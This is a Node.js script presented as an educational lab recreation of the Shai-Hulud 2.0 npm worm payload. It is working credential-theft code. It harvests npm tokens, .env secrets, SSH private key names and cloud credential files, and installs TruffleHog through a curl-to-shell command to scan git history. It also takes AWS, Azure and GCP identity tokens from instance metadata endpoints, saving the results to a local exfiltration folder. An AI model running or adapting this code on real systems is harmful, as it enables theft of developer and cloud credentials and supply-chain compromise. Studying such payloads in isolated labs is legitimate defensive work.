#!/usr/bin/env node
// ============================================================================
// MAIN PAYLOAD: bun_environment.js (educational version)
// ============================================================================
// Performs: local credential scanning, TruffleHog execution, cloud IMDS
// queries, cloud secret enumeration. Designed to run on lab VMs.
//
// This script detects which cloud environment it is running in and adapts
// its behavior accordingly -- exactly like the real Shai-Hulud 2.0 payload.
// ============================================================================

const fs = require("fs");
const path = require("path");
const http = require("http");
const https = require("https");
const { execSync } = require("child_process");
const os = require("os");

const EXFIL_DIR = process.env.WORM_EXFIL_DIR || path.join(os.homedir(), ".shai-hulud-exfil");
if (!fs.existsSync(EXFIL_DIR)) fs.mkdirSync(EXFIL_DIR, { recursive: true });

function log(msg) { console.log("[worm] " + msg); }

// ---- UTILITY: HTTP GET with timeout ----
function httpGet(url, headers) {
  headers = headers || {};
  return new Promise(function(resolve, reject) {
    var proto = url.indexOf("https") === 0 ? https : http;
    var req = proto.get(url, { headers: headers, timeout: 3000 }, function(res) {
      var data = "";
      res.on("data", function(chunk) { data += chunk; });
      res.on("end", function() { resolve({ status: res.statusCode, body: data }); });
    });
    req.on("error", reject);
    req.on("timeout", function() { req.destroy(); reject(new Error("Timeout")); });
  });
}

// ---- PHASE 2A: LOCAL CREDENTIAL SCAN ----
function scanLocal() {
  log("Phase 2A: Local credential scan...");
  var findings = { npm_tokens: [], env_secrets: {}, ssh_keys: [], credential_files: {} };
  var home = os.homedir();

  // 1. npm tokens from .npmrc
  var npmrc = path.join(home, ".npmrc");
  if (fs.existsSync(npmrc)) {
    var content = fs.readFileSync(npmrc, "utf8");
    findings.npm_tokens = (content.match(/_authToken=.*/g) || []);
    log("  [+] " + findings.npm_tokens.length + " npm token(s) in .npmrc");
  }

  // 2. .env files
  [".env", ".env.local", ".env.production"].forEach(function(f) {
    var p = path.join(home, f);
    if (fs.existsSync(p)) {
      var lines = fs.readFileSync(p, "utf8").split("\n").filter(function(l) {
        return l.indexOf("=") > 0 && l.charAt(0) !== "#";
      });
      lines.forEach(function(l) {
        var parts = l.split("=");
        var key = parts[0].trim();
        var val = parts.slice(1).join("=").trim();
        if (/KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL/i.test(key)) {
          findings.env_secrets[key] = val;
        }
      });
      log("  [+] " + Object.keys(findings.env_secrets).length + " secret(s) in " + f);
    }
  });

  // 3. SSH keys
  var sshDir = path.join(home, ".ssh");
  if (fs.existsSync(sshDir)) {
    findings.ssh_keys = fs.readdirSync(sshDir).filter(function(f) {
      return f.indexOf(".pub") === -1 && f !== "known_hosts" && f !== "config" && f !== "authorized_keys";
    });
    log("  [+] " + findings.ssh_keys.length + " SSH private key(s)");
  }

  // 4. Cloud credential files
  var credPaths = {
    "aws_credentials": ".aws/credentials",
    "azure_profile": ".azure/azureProfile.json",
    "gcp_adc": ".config/gcloud/application_default_credentials.json"
  };
  Object.keys(credPaths).forEach(function(name) {
    if (fs.existsSync(path.join(home, credPaths[name]))) {
      findings.credential_files[name] = "PRESENT";
      log("  [+] Found " + credPaths[name]);
    }
  });

  // 5. Git repos (for TruffleHog)
  var projectDirs = ["projects", "repos", "src", "code"];
  findings.git_repos = [];
  projectDirs.forEach(function(d) {
    var dir = path.join(home, d);
    if (fs.existsSync(dir)) {
      fs.readdirSync(dir).forEach(function(sub) {
        if (fs.existsSync(path.join(dir, sub, ".git"))) {
          findings.git_repos.push(path.join(dir, sub));
        }
      });
    }
  });
  log("  [+] " + findings.git_repos.length + " git repo(s) found for TruffleHog");

  // Save findings
  fs.writeFileSync(path.join(EXFIL_DIR, "local_credentials.json"), JSON.stringify(findings, null, 2));
  return findings;
}

// ---- PHASE 2B: TRUFFLEHOG ----
function runTruffleHog(repos) {
  log("Phase 2B: TruffleHog secret scanning...");

  // Check if TruffleHog is available
  var thPath;
  try {
    thPath = execSync("which trufflehog 2>/dev/null || echo ''", { encoding: "utf8" }).trim();
  } catch (e) { thPath = ""; }

  if (!thPath) {
    log("  [*] TruffleHog not installed. Attempting download...");
    try {
      execSync(
        "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin 2>/dev/null || " +
        "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin 2>/dev/null",
        { stdio: "pipe", timeout: 120000 }
      );
      thPath = "/usr/local/bin/trufflehog";
      log("  [+] TruffleHog installed at " + thPath);
    } catch (e) {
      log("  [-] TruffleHog download failed. The real worm cached it in ~/.truffler-cache/");
      log("  [-] Skipping deep git history scan.");
      return;
    }
  }

  // Scan each git repo
  (repos || []).forEach(function(repoPath) {
    log("  [*] Scanning git history: " + repoPath);
    try {
      var results = execSync(
        thPath + " git file://" + repoPath + " --json --no-update 2>/dev/null || true",
        { encoding: "utf8", timeout: 60000, maxBuffer: 10 * 1024 * 1024 }
      ).trim();

      var secrets = results.split("\n").filter(function(l) { return l.charAt(0) === "{"; });
      if (secrets.length > 0) {
        log("  [+] TruffleHog found " + secrets.length + " secret(s) in git history!");
        var repoName = path.basename(repoPath);
        fs.writeFileSync(path.join(EXFIL_DIR, "trufflehog_" + repoName + ".json"), secrets.join("\n"));
      } else {
        log("  [-] No secrets found in " + path.basename(repoPath));
      }
    } catch (e) {
      log("  [-] Scan error: " + e.message.split("\n")[0]);
    }
  });
}

// ---- PHASE 2C: AWS IMDS ----
async function harvestAWS() {
  log("Phase 2C: AWS IMDS credential theft...");
  try {
    var roleResp = await httpGet("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
    if (roleResp.status !== 200) throw new Error("IMDS returned " + roleResp.status);

    var roleName = roleResp.body.trim();
    log("  [+] IAM role: " + roleName);

    var credsResp = await httpGet("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName);
    var creds = JSON.parse(credsResp.body);
    log("  [+] AccessKeyId: " + creds.AccessKeyId);
    log("  [+] Expiration:  " + creds.Expiration);

    fs.writeFileSync(path.join(EXFIL_DIR, "aws_imds.json"), JSON.stringify({
      role: roleName,
      AccessKeyId: creds.AccessKeyId,
      Expiration: creds.Expiration,
      note: "SecretAccessKey and Token also captured (truncated for safety)"
    }, null, 2));
    return creds;
  } catch (e) {
    log("  [-] AWS IMDS not reachable: " + e.message);
    return null;
  }
}

// ---- PHASE 2D: AZURE IMDS ----
async function harvestAzure() {
  log("Phase 2D: Azure IMDS Managed Identity token theft...");
  try {
    var resp = await httpGet(
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net",
      { "Metadata": "true" }
    );
    if (resp.status !== 200) throw new Error("Azure IMDS returned " + resp.status);

    var data = JSON.parse(resp.body);
    log("  [+] Token type:  " + data.token_type);
    log("  [+] Resource:    " + data.resource);
    log("  [+] Expires on:  " + data.expires_on);
    log("  [+] Token:       " + data.access_token.substring(0, 20) + "...");

    fs.writeFileSync(path.join(EXFIL_DIR, "azure_imds.json"), JSON.stringify({
      token_type: data.token_type,
      resource: data.resource,
      expires_on: data.expires_on,
      token_preview: data.access_token.substring(0, 30) + "..."
    }, null, 2));
    return data.access_token;
  } catch (e) {
    log("  [-] Azure IMDS not reachable: " + e.message);
    return null;
  }
}

// ---- PHASE 2E: GCP METADATA ----
async function harvestGCP() {
  log("Phase 2E: GCP metadata server token theft...");
  try {
    var resp = await httpGet(
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      { "Metadata-Flavor": "Google" }
    );
    if (resp.status !== 200) throw new Error("GCP metadata returned " + resp.status);

    var data = JSON.parse(resp.body);
    log("  [+] Token type:  " + data.token_type);
    log("  [+] Expires in:  " + data.expires_in + "s");

    var emailResp = await httpGet(
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
      { "Metadata-Flavor": "Google" }
    );
    log("  [+] SA email:    " + emailResp.body);

    fs.writeFileSync(path.join(EXFIL_DIR, "gcp_metadata.json"), JSON.stringify({
      token_type: data.token_type,
      expires_in: data.expires_in,
      service_account: emailResp.body,
      token_preview: data.access_token.substring(0, 20) + "..."
    }, null, 2));
    return data.access_token;
  } catch (e) {
    log("  [-] GCP metadata not reachable: " + e.message);
    return null;
  }
}

// ---- MAIN ----
async function main() {
  console.log("");
  console.log("========================================");
  console.log(" Shai-Hulud 2.0 -- Lab Payload");
  console.log("  Runtime: " + (process.env.PAYLOAD_RUNTIME || "node"));
  console.log("  Host:    " + os.hostname());
  console.log("  User:    " + os.userInfo().username);
  console.log("  OS:      " + os.platform() + " " + os.arch());
  console.log("  Time:    " + new Date().toISOString());
  console.log("========================================");

  var localFindings = scanLocal();
  console.log("");
  runTruffleHog(localFindings.git_repos);
  console.log("");
  await harvestAWS();
  console.log("");
  await harvestAzure();
  console.log("");
  await harvestGCP();

  console.log("");
  console.log("========================================");
  console.log(" Results: " + EXFIL_DIR);
  console.log("========================================");
  console.log("");
}

main().catch(console.error);
